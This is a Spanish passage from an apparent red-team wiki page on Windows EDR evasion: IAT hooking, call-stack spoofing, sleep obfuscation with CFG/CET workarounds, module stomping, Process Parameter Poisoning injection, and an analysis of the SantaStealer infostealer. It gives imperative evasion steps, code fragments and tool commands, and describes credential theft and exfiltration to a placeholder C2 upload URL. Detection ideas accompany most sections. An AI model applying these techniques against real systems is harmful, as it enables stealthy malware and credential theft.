- Enmascaramiento/desenmascaramiento de memoria alrededor de la llamada (por ejemplo, cifrar regiones del beacon, cambiar de RWX→RX y modificar los nombres/permisos de las páginas), y restauración posterior a la llamada.
- Call-stack spoofing: construir una pila benigna y realizar la transición a la API objetivo para que el análisis del call-stack resuelva los frames esperados.<sup>[[9]](#references)</sup>
- Por compatibilidad, exportar una interfaz para que un script de Aggressor (o equivalente) pueda registrar qué APIs deben interceptarse para Beacon, BOFs y DLLs de post-explotación.

Por qué usar IAT hooking aquí
- Funciona con cualquier código que utilice la importación interceptada, sin modificar el código de la herramienta ni depender de Beacon para hacer proxy de APIs específicas.
- Cubre las DLLs de post-explotación: interceptar LoadLibrary* permite interceptar las cargas de módulos (por ejemplo, System.Management.Automation.dll, clr.dll) y aplicar el mismo enmascaramiento/ evasión del stack a sus llamadas a APIs.
- Restaura el uso fiable de comandos de post-explotación que crean procesos frente a detecciones basadas en el call-stack mediante el wrapping de CreateProcessA/W.

Esquema mínimo de IAT hook (pseudocódigo C/C++ x64)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el patch después de las relocations/ASLR y antes del primer uso del import. Los reflective loaders como TitanLdr/AceLdr demuestran el hooking durante el DllMain del módulo cargado.
- Mantén los wrappers pequeños y seguros para PIC; resuelve la API real mediante el valor original de la IAT que capturaste antes del patching o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas con permisos de escritura + ejecución.

Stub de call-stack spoofing
- Los stubs PIC de estilo Draugr construyen una cadena de llamadas falsa (return addresses dentro de módulos benignos) y después hacen pivot hacia la API real.
- Esto evade las detecciones que esperan stacks canónicos desde Beacon/BOFs hacia APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para aterrizar dentro de los frames esperados antes del prólogo de la API.

Integración operativa
- Anteponer el reflective loader a las DLLs post-ex para que el PIC y los hooks se inicialicen automáticamente cuando se cargue la DLL.
- Usa un Aggressor script para registrar las APIs objetivo, de modo que Beacon y los BOFs se beneficien de forma transparente de la misma ruta de evasión sin cambios en el código.

Consideraciones de detección/DFIR
- Integridad de la IAT: entradas que resuelven a direcciones no pertenecientes a una image (heap/anónimas); verificación periódica de los punteros de import.
- Anomalías del stack: return addresses que no pertenecen a images cargadas; transiciones abruptas hacia PIC no perteneciente a una image; ascendencia de RtlUserThreadStart inconsistente.
- Telemetría del loader: escrituras in-process en la IAT, actividad temprana de DllMain que modifica los import thunks, regiones RX inesperadas creadas durante la carga.
- Evasión de image-load: si haces hooking de LoadLibrary*, monitoriza cargas sospechosas de assemblies de automation/clr correlacionadas con eventos de memory masking.

Building blocks y ejemplos relacionados
- Reflective loaders que realizan patching de la IAT durante la carga (p. ej., TitanLdr, AceLdr)
- Hooks de memory masking (p. ej., simplehook) y PIC de stack-cutting (stackcutting)
- Stubs PIC de call-stack spoofing (p. ej., Draugr)


## Hooking de IAT en tiempo de importación + ofuscación de sleep (Crystal Palace/PICO)

### Hooks de IAT en tiempo de importación mediante un PICO residente

Si controlas un reflective loader, puedes hacer hooking de los imports **durante** `ProcessImports()` reemplazando el puntero del loader a `GetProcAddress` por un resolver personalizado que compruebe primero los hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Construye un **PICO residente** (objeto PIC persistente) que sobreviva después de que el PIC transitorio del loader se libere.
- Exporta una función `setup_hooks()` que sobrescriba el resolver de imports del loader (p. ej., `funcs.GetProcAddress = _GetProcAddress`).
- En `_GetProcAddress`, omite los imports ordinales y usa una búsqueda de hooks basada en hashes, como `__resolve_hook(ror13hash(name))`. Si existe un hook, devuélvelo; de lo contrario, delega en el `GetProcAddress` real.
- Registra los objetivos de hooking en el link time con las entradas de Crystal Palace `addhook "MODULE$Func" "hook"`. El hook sigue siendo válido porque vive dentro del PICO residente.

Esto produce una **redirección de la IAT en tiempo de importación** sin parchear la sección de código de la DLL cargada después de la carga.

### Forzar imports hookeables cuando el objetivo usa PEB-walking

Los hooks de importación solo se activan si la función está realmente en la IAT del objetivo. Si un módulo resuelve APIs mediante un PEB-walk + hash (sin una entrada de import), fuerza un import real para que la ruta `ProcessImports()` del loader pueda detectarlo:

- Sustituye la resolución de exports basada en hashes (p. ej., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) por una referencia directa como `&WaitForSingleObject`.
- El compilador emite una entrada de la IAT, lo que permite la intercepción cuando el reflective loader resuelve los imports.

### Ofuscación de sleep/idle al estilo Ekko sin parchear `Sleep()`

En lugar de parchear `Sleep`, haz hooking de las primitivas reales de espera/IPC que usa el implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para esperas prolongadas, envuelve la llamada en una cadena de ofuscación al estilo Ekko que cifre la image en memoria durante el idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` para programar una secuencia de callbacks que llamen a `NtContinue` con frames `CONTEXT` creados manualmente.
- Cadena típica (x64): establece la image como `PAGE_READWRITE` → cifrado RC4 mediante `advapi32!SystemFunction032` sobre la image mapeada completa → realiza la espera bloqueante → descifrado RC4 → **restaura los permisos por sección** recorriendo las secciones PE → indica la finalización.
- `RtlCaptureContext` proporciona una plantilla `CONTEXT`; clónala en múltiples frames y establece los registros (`Rip/Rcx/Rdx/R8/R9`) para invocar cada paso.

Detalle operativo: devuelve “success” para las esperas prolongadas (p. ej., `WAIT_OBJECT_0`) para que el caller continúe mientras la image está enmascarada. Este patrón oculta el módulo de los scanners durante las ventanas de idle y evita la firma clásica de un `Sleep()` parcheado.

Ideas de detección (basadas en telemetría)
- Ráfagas de callbacks de `CreateTimerQueueTimer` que apunten a `NtContinue`.
- Uso de `advapi32!SystemFunction032` sobre buffers contiguos grandes, del tamaño de una image.
- `VirtualProtect` sobre rangos grandes seguido de una restauración personalizada de permisos por sección.

### Registro de CFG en runtime para gadgets de sleep-obfuscation

En objetivos con CFG habilitado, el primer salto indirecto hacia un gadget dentro de una función, como `jmp [rbx]` o `jmp rdi`, normalmente provocará el crash del proceso con `STATUS_STACK_BUFFER_OVERRUN` porque el gadget no está presente en los metadatos CFG del módulo. Para mantener activas las cadenas al estilo Ekko/Kraken dentro de procesos hardened:<sup>[[30]](#references)</sup>

- Registra cada destino indirecto usado por la cadena con `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` y entradas `CFG_CALL_TARGET_VALID`.
- Para direcciones dentro de images cargadas (`ntdll`, `kernel32`, `advapi32`), el `MEMORY_RANGE_ENTRY` debe comenzar en la **base de la image** y cubrir el **tamaño completo de la image**.
- Para regiones manualmente mapeadas/PIC/stomped, usa la **allocation base** y el tamaño de la allocation.
- Marca no solo el gadget de dispatch, sino también los exports alcanzados indirectamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, syscalls de wait/event) y cualquier sección ejecutable controlada por el atacante que vaya a convertirse en un destino indirecto.

Esto convierte las cadenas de sleep de estilo ROP/JOP de “solo funcionan en procesos sin CFG” en una primitive reutilizable para `explorer.exe`, browsers, `svchost.exe` y otros endpoints compilados con `/guard:cf`.

### Stack spoofing seguro para CET en threads en sleep

El reemplazo completo de `CONTEXT` es ruidoso y puede fallar en sistemas con CET Shadow Stack porque un `Rip` spoofed aún debe coincidir con el shadow stack de hardware. Un patrón más seguro de sleep-masking es:<sup>[[30]](#references)</sup>

- Elige otro thread del mismo proceso y lee los límites de su stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) mediante `NtQueryInformationThread`.
- Haz backup del TEB/TIB real del thread actual.
- Captura el contexto real del sleep con `GetThreadContext`.
- Copia **solo el `Rip` real** al contexto spoof, dejando intactos el `Rsp` spoofed y el estado del stack.
- Durante la ventana de sleep, copia el `NT_TIB` del thread spoof al TEB actual para que los stack walkers hagan unwind dentro de un rango de stack legítimo.
- Cuando termine la espera, restaura el TIB y el contexto originales del thread.

Esto conserva un instruction pointer coherente con CET mientras engaña a los stack walkers de EDR que confían en los metadatos del stack del TEB para validar los unwinds.

### Alternativa basada en APC: Kraken Mask

Si el dispatch mediante timer-queue tiene demasiadas signatures, la misma secuencia de sleep-encrypt-spoof-restore puede ejecutarse desde un helper thread suspendido usando APCs encolados:<sup>[[27]](#references)</sup>

- Crea un helper thread con `NtTestAlert` como entrypoint.
- Encola frames `CONTEXT`/APCs preparados con `NtQueueApcThread` y drénalos con `NtAlertResumeThread`.
- Almacena el estado de la cadena en el heap en lugar de hacerlo en el stack del helper para evitar agotar el stack predeterminado de 64 KB del thread.
- Usa `NtSignalAndWaitForSingleObject` para indicar atómicamente el evento de inicio y bloquearse.
- Suspende el thread principal antes de restaurar el TIB/contexto (`NtSuspendThread` → restore → `NtResumeThread`) para reducir la ventana de race en la que un scanner podría detectar un stack parcialmente restaurado.

Esto sustituye la signature `CreateTimerQueueTimer` + `NtContinue` por una signature de helper-thread/APC, manteniendo los mismos objetivos de RC4 masking y stack-spoofing.

Ideas de detección adicionales
- `NtSetInformationVirtualMemory` con `VmCfgCallTargetInformation` poco antes de sleeps, waits o dispatch de APC.
- `GetThreadContext`/`SetThreadContext` alrededor de `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` o `ConnectNamedPipe`.
- `NtQueryInformationThread` seguido de escrituras directas en los límites del stack del TEB/TIB del thread actual.
- Cadenas `NtQueueApcThread`/`NtAlertResumeThread` que alcancen indirectamente `SystemFunction032`, `VirtualProtect` o helpers de restauración de permisos por sección.
- Uso repetido de signatures cortas de gadgets como `FF 23` (`jmp [rbx]`) o `FF E7` (`jmp rdi`) como pivots de dispatch dentro de módulos firmados.


## Precision Module Stomping

Module stomping ejecuta payloads desde la **sección `.text` de una DLL ya mapeada dentro del proceso objetivo** en lugar de asignar memoria privada ejecutable obvia o cargar una DLL sacrificial nueva. El objetivo de la sobrescritura debe ser una **image cargada y respaldada por disco** cuyo espacio de código pueda absorber el payload sin corromper las rutas de código que el proceso aún necesita.<sup>[[1]](#references)[[2]](#references)</sup>

### Selección fiable del objetivo

El stomping ingenuo contra módulos comunes como `uxtheme.dll` o `comctl32.dll` es frágil: la DLL puede no estar cargada en el proceso remoto, y una región de código demasiado pequeña provocará el crash del proceso. Un workflow más fiable es:

1. Enumera los módulos del proceso objetivo y conserva una **include list basada únicamente en nombres** de las DLLs ya cargadas.
2. Compila primero el payload y registra su **tamaño exacto en bytes**.
3. Escanea las DLLs candidatas en disco y compara `Misc_VirtualSize` de la sección PE **`.text`** con el tamaño del payload. Esto es más importante que el tamaño del archivo porque refleja el tamaño de la sección ejecutable **cuando se mapea en memoria**.
4. Analiza la **Export Address Table (EAT)** y elige el RVA de una función exportada como offset inicial del stomp.
5. Calcula el **blast radius**: si el payload supera el límite de la función seleccionada, sobrescribirá los exports adyacentes colocados después de ella en memoria.

Helpers habituales de recon/selección observados en la práctica:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Notas operativas
- Prefiere DLLs **ya cargadas** en el proceso remoto para evitar la telemetría de `LoadLibrary`/cargas de imágenes inesperadas.
- Prefiere exports que la aplicación objetivo ejecute rara vez; de lo contrario, las rutas de código normales podrían alcanzar los bytes modificados antes o después de la creación del thread.
- Los implants grandes suelen requerir cambiar la inserción del shellcode de un literal de cadena a un **byte-array/braced initializer** para que el búfer completo se represente correctamente en el código fuente del injector.

Ideas de detección
- Escrituras remotas en **páginas ejecutables respaldadas por imágenes** (`MEM_IMAGE`, `PAGE_EXECUTE*`) en lugar de las asignaciones privadas RWX/RX más comunes.
- Entry points de exports cuyos bytes en memoria ya no coinciden con el archivo de respaldo en disco.
- Threads remotos o pivots de contexto que comienzan la ejecución dentro de un export legítimo de una DLL cuyos primeros bytes se modificaron recientemente.
- Secuencias sospechosas de `VirtualProtect(Ex)` / `WriteProcessMemory` contra páginas `.text` de DLL, seguidas de la creación de un thread.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) es una técnica de **process-injection / EDR-evasion** que evita la ruta clásica de escritura remota (`VirtualAllocEx` + `WriteProcessMemory`). En lugar de copiar bytes a un target ya en ejecución, abusa del hecho de que Windows **copia determinados parámetros de inicio de `CreateProcessW` al proceso hijo** y los almacena dentro de `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers que `CreateProcessW` puede envenenar y copiar

Los carriers útiles son:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (con `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Restricciones prácticas de los carriers:

- `lpCommandLine` debe apuntar a memoria **writable** para `CreateProcessW` y está limitado a **32,767 caracteres Unicode**, incluido el terminador nulo.
- `lpEnvironment` debe ser un bloque de entorno Unicode compuesto por cadenas sucesivas `NAME=VALUE\0`, terminadas por un `\0` adicional.
- `lpReserved` está reservado oficialmente, por lo que el mapeo a `ShellInfo` debe tratarse como un detalle de implementación y no como un contrato documentado estable.

Esto convierte la creación normal de procesos en el **payload-transfer primitive**. El operador crea el proceso hijo con datos de inicio controlados por el atacante y permite que Windows realice la copia entre procesos.

### Flujo de búsqueda remota sin APIs de escritura remota

Después de crear el proceso hijo, resuelve el búfer copiado usando primitives de solo lectura:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → obtener `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Leer el `PEB` remoto
3. Seguir `PEB.ProcessParameters`
4. Leer `RTL_USER_PROCESS_PARAMETERS`
5. Usar el puntero seleccionado:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Flujo mínimo:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Ejecución del búfer de parámetros copiado

La región de parámetros copiada normalmente tiene permisos `RW`, no es ejecutable. Un P3 chain común es:

1. Crear el proceso normalmente (no suspendido)
2. Hacer ejecutable la página de parámetros elegida con `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Reutilizar el handle del thread principal ya devuelto en `PROCESS_INFORMATION`
4. Redirigir la ejecución con `NtSetContextThread` (`CONTEXT_CONTROL`, sobrescribir `RIP`)

A diferencia de los workflows clásicos de thread hijacking, esto **no requiere** `SuspendThread` / `ResumeThread`; el contexto puede cambiarse directamente en el handle del thread principal devuelto.

Esto evita varias APIs monitorizadas habitualmente para injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- a menudo también `SuspendThread` / `ResumeThread`

### Limitación de los bytes nulos y staged shellcode

Los tres carriers son **datos de tipo string o similares a strings**, por lo que un payload sin procesar que contenga `0x00` se trunca durante la transferencia. Una solución práctica es utilizar un **first stage sin bytes nulos** que reconstruya las constantes en runtime y después cargue un segundo stage arbitrario.

Un patrón sencillo es la síntesis de constantes basada en XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Esto permite que la primera etapa construya cadenas para la pila, argumentos de API, rutas de DLL o un loader de shellcode de segunda etapa sin insertar bytes nulos en el parámetro transportado.

### Llamadas a API basadas en la pila desde la primera etapa

Cuando la primera etapa debe llamar a APIs como `LoadLibraryA`, puede:

- hacer push de la cadena/buffer en la pila del objetivo
- reservar el **shadow space de 32 bytes de x64**
- establecer `RCX`, `RDX`, `R8`, `R9` con constantes o punteros relativos a `RSP`
- mantener `RSP` **alineado a 16 bytes** antes de la llamada

A continuación, una segunda etapa puede copiarse desde la pila a una asignación `PAGE_READWRITE`, cambiarse a `PAGE_EXECUTE_READ` con `VirtualProtect` y ejecutarse mediante un salto, evitando una asignación RWX directa.

### Ideas para la detección

Buenas oportunidades de hunting mencionadas por los autores:

- `VirtualProtectEx` / `NtProtectVirtualMemory` haciendo **ejecutables las páginas de parámetros del proceso**
- ese cambio de protección seguido de `SetThreadContext` / `NtSetContextThread`
- lecturas remotas del `PEB` y posteriormente de `RTL_USER_PROCESS_PARAMETERS`
- valores de `lpCommandLine`, `lpEnvironment` o `STARTUPINFO.lpReserved` inusualmente largos o con alta entropía durante la creación del proceso

### Notas

- P3 es un **truco de transferencia entre procesos**, no una primitiva de ejecución completa por sí mismo: el parámetro copiado aún necesita un cambio a permisos de ejecución y un método de redirección de la ejecución.
- Los autores consideraron `RtlCreateProcessReflection` / Dirty Vanity, pero lo rechazaron porque internamente alcanza primitivas sospechosas como `NtWriteVirtualMemory` y `NtCreateThreadEx`.

## Tradecraft de SantaStealer para la evasión fileless y el robo de credenciales

SantaStealer (también conocido como BluelineStealer) muestra cómo los info-stealers modernos combinan AV bypass, anti-analysis y acceso a credenciales en un único workflow.<sup>[[24]](#references)</sup>

### Filtrado por distribución del teclado y retraso en sandbox

- Un flag de configuración (`anti_cis`) enumera las distribuciones de teclado instaladas mediante `GetKeyboardLayoutList`. Si encuentra una distribución cirílica, el sample crea un marcador `CIS` vacío y termina antes de ejecutar los stealers, garantizando que nunca detone en locales excluidos mientras deja un artefacto útil para el hunting.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Lógica `check_antivm` por capas

- La variante A recorre la lista de procesos, aplica un checksum rolling personalizado a cada nombre y lo compara con blocklists integradas para debuggers/sandboxes; repite el checksum con el nombre del equipo y comprueba directorios de trabajo como `C:\analysis`.
- La variante B inspecciona propiedades del sistema (umbral mínimo de procesos, tiempo de actividad reciente), llama a `OpenServiceA("VBoxGuest")` para detectar las additions de VirtualBox y realiza comprobaciones de tiempo alrededor de pausas para detectar single-stepping. Cualquier coincidencia provoca la interrupción antes de iniciar los módulos.

### Helper Fileless + carga reflectiva con doble ChaCha20

- La DLL/EXE principal integra un helper de credenciales de Chromium que se descarga al disco o se mapea manualmente en memoria; el modo fileless resuelve por sí mismo las imports/relocations, por lo que no se escriben artefactos del helper.
- Ese helper almacena una DLL de segunda etapa cifrada dos veces con ChaCha20 (dos claves de 32 bytes + nonces de 12 bytes). Después de ambas pasadas, carga reflectivamente el blob (sin `LoadLibrary`) y llama a las exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, derivadas de [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Las rutinas de ChromElevator utilizan process hollowing reflectivo mediante direct-syscall para inyectarse en un navegador Chromium activo, heredar las claves de AppBound Encryption y descifrar contraseñas/cookies/tarjetas de crédito directamente desde bases de datos SQLite, a pesar del hardening de ABE.


### Recopilación modular en memoria y exfiltración HTTP fragmentada

- `create_memory_based_log` itera sobre una tabla global de punteros a funciones `memory_generators` y crea un thread por cada módulo habilitado (Telegram, Discord, Steam, screenshots, documentos, extensiones del navegador, etc.). Cada thread escribe los resultados en buffers compartidos e informa de su cantidad de archivos después de una ventana de join de aproximadamente 45 s.
- Una vez finalizado, todo se comprime con la librería enlazada estáticamente `miniz` como `%TEMP%\\Log.zip`. A continuación, `ThreadPayload1` espera 15 s y transmite el archivo en fragmentos de 10 MB mediante HTTP POST a `http://<C2>:6767/upload`, falsificando un boundary de navegador `multipart/form-data` (`----WebKitFormBoundary***`). Cada fragmento añade `User-Agent: upload`, `auth: <build_id>`, `w: <campaign_tag>` opcional, y el último fragmento añade `complete: true` para que el C2 sepa que la reensamblación ha terminado.

## References

- [1] [Tradecraft avanzado de evasión: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks, no más pases libres para el malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – documentación](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – ejemplo](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – ejemplo](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC con spoofing de call stack](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Nueva cadena de infección y ofuscación basada en ConfuserEx para DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – ¿Deberías confiar en tu zero trust? Bypassing de las comprobaciones de postura de Zscaler](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Antes de ToolShell: explorando las operaciones anteriores de ransomware de Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: abusando de las exports reenviadas](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventario de Forwarded Exports de Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – orden de búsqueda de las dynamic-link libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – seguridad de procesos y derechos de acceso](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – referencia de EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [launcher de CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – contrarrestando los EDR con el respaldo de Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – rompe la protective shell de Windows Defender con la técnica de redirección de carpetas](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – referencia del comando mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Bajo la cortina pura: de RAT a builder y a coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer llega a la ciudad: un nuevo y ambicioso infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – descifrado de Chrome App Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: derrotando el malware de Node.js con API Tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Sleeping Beauty: poniendo Adaptix a dormir con Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Sleeping Beauty II: CFG, CET y spoofing de stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ofuscación de sleep de Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - ocultando tu Dotnet Etw](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - abusando de Chrome Remote Desktop en operaciones de Red Team: una guía práctica](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
{{#include ../banners/hacktricks-training.md}}
